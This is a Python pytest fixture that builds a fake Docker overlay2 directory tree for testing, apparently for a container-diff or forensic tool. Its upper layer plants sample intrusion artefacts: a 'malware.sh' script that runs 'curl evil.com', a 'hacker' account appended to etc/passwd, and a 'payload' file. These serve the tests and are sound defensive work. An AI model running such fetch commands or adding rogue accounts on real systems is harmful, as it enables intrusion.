"""
Shared test fixtures: a minimal but structurally correct fake Docker root.

Layout:
  docker/
    overlay2/
      layer0_cache/diff/   ← base OS layer (etc/passwd, etc/hosts, usr/bin/sh)
      layer1_cache/diff/   ← app layer    (app/main.py)
      upper_cache/diff/    ← container's writable upper layer
    image/overlay2/
      imagedb/content/sha256/<image_id>
      layerdb/sha256/<chain_id_0>/cache-id
      layerdb/sha256/<chain_id_1>/cache-id
      layerdb/mounts/<container_id>/mount-id
      repositories.json
    containers/<container_id>/
      config.v2.json
      <container_id>-json.log
"""

import hashlib
import json
import pytest
from pathlib import Path


def _compute_chain_ids(diff_ids: list[str]) -> list[str]:
    result = []
    for i, did in enumerate(diff_ids):
        raw = did.removeprefix("sha256:")
        if i == 0:
            result.append(raw)
        else:
            parent = result[-1]
            digest = hashlib.sha256(f"sha256:{parent} {did}".encode()).hexdigest()
            result.append(digest)
    return result


@pytest.fixture
def docker_root(tmp_path):
    root = tmp_path / "docker"

    image_id     = "a" * 64
    cache_id_0   = "layer0_cache"
    cache_id_1   = "layer1_cache"
    container_id = "c" * 64
    upper_id     = "upper_cache"

    diff_id_0 = "sha256:" + "d" * 64
    diff_id_1 = "sha256:" + "e" * 64
    chain_ids = _compute_chain_ids([diff_id_0, diff_id_1])

    # ── Layer 0: base OS layer ───────────────────────────────────────────────
    layer0 = root / "overlay2" / cache_id_0 / "diff"
    layer0.mkdir(parents=True)
    (layer0 / "etc").mkdir()
    (layer0 / "etc" / "passwd").write_text("root:x:0:0:root:/root:/bin/sh\n")
    (layer0 / "etc" / "hosts").write_text("127.0.0.1 localhost\n")
    (layer0 / "usr").mkdir()
    (layer0 / "usr" / "bin").mkdir()
    (layer0 / "usr" / "bin" / "sh").write_bytes(b"\x7fELF")

    # ── Layer 1: app layer ───────────────────────────────────────────────────
    layer1 = root / "overlay2" / cache_id_1 / "diff"
    layer1.mkdir(parents=True)
    (layer1 / "app").mkdir()
    (layer1 / "app" / "main.py").write_text("print('hello')\n")

    # ── Upper (container writable) layer ─────────────────────────────────────
    upper = root / "overlay2" / upper_id / "diff"
    upper.mkdir(parents=True)
    (upper / "etc").mkdir()
    # Modified: passwd exists in layer 0 → M
    (upper / "etc" / "passwd").write_text(
        "root:x:0:0:root:/root:/bin/sh\nhacker:x:1000:::/bin/sh\n"
    )
    # Added: new file not in any image layer → A
    (upper / "etc" / "malware.sh").write_text("#!/bin/sh\ncurl evil.com\n")
    # Deleted: whiteout for /etc/hosts → D
    (upper / "etc" / ".wh.hosts").write_text("")
    # Added directory with file
    (upper / "tmp").mkdir()
    (upper / "tmp" / "payload").write_bytes(b"\x00" * 512)

    # ── Image config ─────────────────────────────────────────────────────────
    img_db = root / "image" / "overlay2" / "imagedb" / "content" / "sha256"
    img_db.mkdir(parents=True)
    (img_db / image_id).write_text(json.dumps({
        "created": "2024-01-01T00:00:00Z",
        "os": "linux",
        "architecture": "amd64",
        "docker_version": "24.0.0",
        "rootfs": {"type": "layers", "diff_ids": [diff_id_0, diff_id_1]},
        "config": {
            "Env": ["PATH=/usr/bin:/bin"],
            "Cmd": ["/bin/sh"],
            "Labels": {},
        },
        "history": [
            {"created_by": "FROM scratch"},
            {"created_by": "COPY app/ /app/"},
        ],
    }))

    # ── layerdb: chain ID → cache ID ─────────────────────────────────────────
    layerdb = root / "image" / "overlay2" / "layerdb" / "sha256"
    for cid_hash, cache_id in [(chain_ids[0], cache_id_0), (chain_ids[1], cache_id_1)]:
        d = layerdb / cid_hash
        d.mkdir(parents=True)
        (d / "cache-id").write_text(cache_id)

    # ── repositories.json ────────────────────────────────────────────────────
    repo_file = root / "image" / "overlay2" / "repositories.json"
    repo_file.write_text(json.dumps({
        "Repositories": {
            "myimage": {"myimage:latest": "sha256:" + image_id}
        }
    }))

    # ── Container config ─────────────────────────────────────────────────────
    ctr_dir = root / "containers" / container_id
    ctr_dir.mkdir(parents=True)
    (ctr_dir / "config.v2.json").write_text(json.dumps({
        "ID": container_id,
        "Name": "/test-container",
        "Created": "2024-06-01T10:00:00Z",
        "Image": "sha256:" + image_id,
        "Config": {
            "Image": "myimage:latest",
            "Env": ["PATH=/usr/bin:/bin"],
            "Cmd": ["/bin/sh"],
            "Labels": {},
        },
        "State": {
            "Status": "exited",
            "Running": False,
            "ExitCode": 1,
            "StartedAt": "2024-06-01T10:00:01Z",
            "FinishedAt": "2024-06-01T10:05:00Z",
            "Error": "",
        },
        "HostConfig": {
            "Binds": None,
            "RestartPolicy": {"Name": "no", "MaximumRetryCount": 0},
        },
        "NetworkSettings": {"Networks": {}, "Ports": {}},
        "MountPoints": {},
    }))

    # ── Container log (JSON Lines) ────────────────────────────────────────────
    log_lines = [
        {"log": "Starting up\n",      "stream": "stdout", "time": "2024-06-01T10:00:01Z"},
        {"log": "error: bad cert\n",  "stream": "stderr", "time": "2024-06-01T10:00:02Z"},
        {"log": "Connected\n",        "stream": "stdout", "time": "2024-06-01T10:00:03Z"},
    ]
    log_path = ctr_dir / f"{container_id}-json.log"
    log_path.write_text("\n".join(json.dumps(e) for e in log_lines) + "\n")

    # ── layerdb/mounts ────────────────────────────────────────────────────────
    mounts_dir = root / "image" / "overlay2" / "layerdb" / "mounts" / container_id
    mounts_dir.mkdir(parents=True)
    (mounts_dir / "mount-id").write_text(upper_id)

    return {
        "root": root,
        "image_id": image_id,
        "container_id": container_id,
        "cache_id_0": cache_id_0,
        "cache_id_1": cache_id_1,
        "upper_id": upper_id,
        "diff_ids": [diff_id_0, diff_id_1],
        "chain_ids": chain_ids,
    }
